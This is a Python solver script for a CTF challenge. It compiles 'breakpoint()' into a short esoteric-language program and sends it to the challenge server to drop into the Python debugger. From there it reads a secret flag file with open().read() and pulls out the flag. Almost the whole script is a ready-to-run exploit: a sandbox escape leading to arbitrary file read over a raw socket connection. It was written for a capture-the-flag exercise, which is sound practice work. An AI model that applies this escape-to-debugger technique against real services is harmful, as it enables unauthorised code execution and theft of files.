#!/usr/bin/env python3
"""Solve THJCC CTF 2026 CTFxck through compact CTFuck and Pdb."""

from __future__ import annotations

import argparse
import re
import socket


DEFAULT_HOST = "chal.thjcc.org"
DEFAULT_PORT = 9002
SOURCE_LIMIT = 110


def receive_until(connection: socket.socket, marker: bytes) -> bytes:
    data = bytearray()
    while marker not in data:
        chunk = connection.recv(65536)
        if not chunk:
            raise ConnectionError(f"connection closed before {marker!r}")
        data.extend(chunk)
    return bytes(data)


def compile_ctfuck(value: bytes) -> str:
    """Encode bytes as queue bits followed by one shared output loop."""
    bits = "".join(
        str((byte >> bit) & 1)
        for byte in value
        for bit in range(8)
    )
    program = bits + "\n.$[2|2]"
    if len(program) > SOURCE_LIMIT:
        raise ValueError(f"program is {len(program)} bytes; limit is {SOURCE_LIMIT}")
    return program


def exploit(host: str, port: int) -> str:
    program = compile_ctfuck(b"breakpoint()")

    with socket.create_connection((host, port), timeout=10) as connection:
        connection.settimeout(10)
        receive_until(connection, b">>> ")
        connection.sendall(program.encode() + b"\nEOF\n")
        transcript = bytearray(receive_until(connection, b"(Pdb) "))

        command = b"p open('/hereisasupersecretfile/flag.txt').read()"
        connection.sendall(command + b"\n")
        transcript.extend(receive_until(connection, b"(Pdb) "))

    match = re.search(rb"THJCC\{[^\r\n}]+\}", transcript)
    if match is None:
        raise RuntimeError(transcript.decode(errors="replace"))
    return match.group().decode()


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("host", nargs="?", default=DEFAULT_HOST)
    parser.add_argument("port", nargs="?", type=int, default=DEFAULT_PORT)
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    program = compile_ctfuck(b"breakpoint()")
    print(f"program length: {len(program)}")
    print(f"flag: {exploit(args.host, args.port)}")


if __name__ == "__main__":
    main()
